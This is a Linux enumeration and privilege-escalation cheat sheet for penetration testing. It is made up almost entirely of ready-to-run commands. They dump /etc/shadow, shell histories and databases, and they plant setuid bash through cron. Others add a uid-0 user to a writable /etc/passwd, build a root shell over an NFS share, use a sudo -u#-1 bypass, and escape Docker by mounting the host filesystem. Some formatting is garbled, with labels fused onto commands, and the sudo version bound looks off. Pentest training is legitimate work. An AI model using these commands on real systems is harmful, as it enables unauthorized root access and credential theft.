Linux Enumeration and Privilege Escalation Cheat Sheet
This document provides a collection of commands and techniques for enumerating Linux systems and performing privilege escalation during penetration testing or security assessments. Use responsibly and only in authorized environments.
Enumeration
Get System Distribution and Version
Bashcat /etc/*-release
Get Kernel Version
Bashcat /proc/version
uname -a
View Variable Environments
Bashenv
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
cat ~/.zshrc
View User Command History
Bashcat ~/.bash_history
cat ~/.zsh_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history
List Running Processes
Bashps aux
View Interfaces and Network Information
Bashifconfig
ip addr
View All Active TCP Connections and Listening Ports
Bashnetstat -ant
Get DNS Resolver and Hosts Mapped to IP
Bashcat /etc/resolv.conf
cat /etc/hosts
Get System User, Group, and Password Information
Bashcat /etc/passwd
cat /etc/shadow
Extracting Database Information
PostgreSQL

Access psql terminal as postgres user:Bashsu postgres
psql
List databases:SQL\list
Select database:SQL\c <database>
List tables:SQL\d
Dump table:SQLselect * from <table>;
Read files:SQLCREATE TABLE demo(t text);
COPY demo from '<filename>';
SELECT * FROM demo;

SQLite

Access database:Bashsqlite3 <database.db>
List tables:SQL.tables
Dump table:SQLselect * from <table>;

MySQL

Access MySQL:Bashmysql -u root -h localhost -p
List databases:SQLshow databases;
Select database:SQLuse <database>;
List tables:SQLshow tables;
Dump table:SQLSELECT * FROM <table>;

Other Tips

Perform code review on web server files (e.g., /var/www/html).
Check log files for credentials.

Privilege Escalation
Crontab
Enumeration
Bashcat /var/log/cron.log
cat /etc/crontab
Exploitation
Bashecho "chmod +s /bin/bash" >> script.sh
SUID
Enumeration
Bashfind / -perm -u=s -type f 2>/dev/null
Or, based on group:
Bashid
find / -perm -u=s -type f -group <group> 2>/dev/null
Exploitation
Refer to: GTFOBins
Capabilities
Enumeration
Bashgetcap -r / 2>/dev/null
Exploitation
Refer to: GTFOBins
Binary with Sudo
Enumeration
Bashsudo -l
Or:
Bashcat /etc/sudoers
Exploitation
Refer to: GTFOBins
Run Commands as Another User with Sudo
Bashsudo -u <username> <command>
Weak File Permissions / Passwd Writable
Enumeration
Bashls -la /etc/passwd
ls -la /etc/shadow
Exploitation
Bashecho "user:$(openssl passwd password123):0:0:root:/root:/usr/bin/bash" >> /etc/passwd
NFS Root Squashing
Detection (on Target VM)
Bashcat /etc/exports
Viewing NFS Directories with Access (on Attacker VM)
Bashshowmount -e <ip>
Get NFS Version (on Attacker VM)
Bashrpcinfo <ip>
Mount (on Attacker VM)
Bashmkdir /tmp/1
mount -o rw,vers=2 <ip>:/<nfs_directory> /tmp/1
Creating and Compiling File for Privesc (on Attacker VM)
Bashecho 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c
gcc /tmp/1/x.c -o /tmp/1/x
chmod +s /tmp/1/x
Exploitation (on Target VM)
Bash/tmp/x
id
Sudo < v1.28 (@sickrov)
Bashsudo -u#-1 /bin/bash
Docker Breakout
Search the Socket
Bashfind / -name docker.sock 2>/dev/null
List Images
Bashdocker images
Exploitation
Bashdocker run -it -v /:/host/ <image>:<tag> chroot /host/ bash
Linux Enumeration Tools
LinPEAS
Bash./linpeas.sh
Repository: PEASS-ng/linPEAS
pspy (Unprivileged Linux Process Snooping)
Bash./pspy64
Repository: pspy
Linux Exploit Suggester
Bash./linux-exploit-suggester.sh
Or with uname:
Bash./linux-exploit-suggester.sh --uname <uname-string>
Repository: linux-exploit-suggester
Unix Privesc Check
Bash./unix-privesc-check
Repository: unix-privesc-check
